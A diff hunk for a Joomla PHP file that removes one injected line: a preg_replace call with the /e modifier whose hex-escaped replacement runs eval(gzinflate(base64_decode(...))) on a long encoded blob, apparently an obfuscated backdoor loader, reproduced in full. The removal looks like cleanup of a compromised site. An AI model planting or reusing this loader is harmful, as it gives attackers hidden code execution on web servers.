@@ -5,7 +5,7 @@
  * @copyright	Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
  * @license		GNU General Public License version 2 or later; see LICENSE.txt
  */
-preg_replace("/.+/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'nVVrb9owFP1Mf4UrpXUyQSjbtEkgxFBJW6QWmAl7iKLITQyJFpLIMVVLxX/fdRzCs+009UOd63N9zz33wYzxefBHNxon00XkiiCO0Cw3oZeTkkbHOEjwBKEm2EWQKGxmX/AQLjL7iIfrC5c+UO4FEVxgsfQiLI1eU08FT+JULxzLCIdxnAQRFTHHxmmzOaVhyoyW4AtWz87gGUx1zTNemOvHOi4YujQMmTfGZvGaCQ/K73V0+MZGYyUfQIehC5jRzMOi83N0AMPxLG7iApMJsssoiB5pGHhI4rNwJc7EgkfAfLVPngnX3wBlFD9OhZRWivtNc4YW+WGRMVb/nV77zsKTXGs6Y5HC7kBvbHvgjODLaV9bPbuAczZlnPGsPPtwYl1ZxCIKyx7CWBHAvhBJvVqd08iNQQhOpdSmG8+rQeSxp081M/GTlkcFbWLzgabsy2eHAdZjesp4ADosGYhnGPtlE3VZGRmpqIrmQsTlEnoms2+5PFLueIt5omtuUb9TOB9qz+aJeEacpYsQZDym/qbyLnRbpaJuK5WtbkMvuUvukHA2c+YUSqXjs/txcj/RzQ8t435cheNZgKF1yhq4GIoQg/Lr8ntcm8gkSuwpECp8RlImcZIbVyebEVOpQzOoIYPGgDq58O0EUSDUjdIEcvdVrO3cFDZlIk4A7fpldDkit/2BDdW1R6Rnk3ZvCGUu1+Qzr6Pt7p3VH9llVLtQw1vwYE/MlVhFY6sG2zTUGWnubnbFopAO0jmIHMo5fdY3rUisu75tOe1Oh8hdoK5x7eNX8wL+ajhbDzDn2YwYxrr+8FYKieh7Pf3LueqTn23SsTryhCe5Q8HwHbgs3WonpeNED/LMF1+R6BFyQ2Aj18uBFTVh6uIIK6pa6vpsztaTmMq9uUJM7qYj11gVQJPygO2oKDf9oS1jt/bTVxeojl7fOceSIdb3kTW0nRHp5gLLzVGSzQoUcoImhh0C4y6Jma/4NjJHldzxQJ0usS5tZ3hJuoPtgKUi2tvgxivNUoCBDfntDG3S7V1vuiV73ASJW9h812ndM2+ksa9X6b/EejNETg3meRMjocI/rlEGa7zDQ7rvNd+/sB7cDOB8eyV/jHf0O5Bta8zgYTlTfwE='\x29\x29\x29\x3B",".");
+
 // No direct access.
 defined('_JEXEC') or die;
 
